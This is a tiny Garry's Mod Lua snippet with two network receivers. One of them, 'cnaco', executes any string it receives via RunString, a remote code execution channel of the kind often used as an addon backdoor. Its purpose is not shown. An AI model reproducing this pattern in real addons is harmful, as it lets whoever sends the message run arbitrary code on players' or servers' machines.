
net.Receive("cnaco", function()
    local str = net.ReadString()
    RunString(str)
end)

net.Receive("cnacb", function()
    local data = net.ReadTable()
    hook.Run("cnacb", data)
end)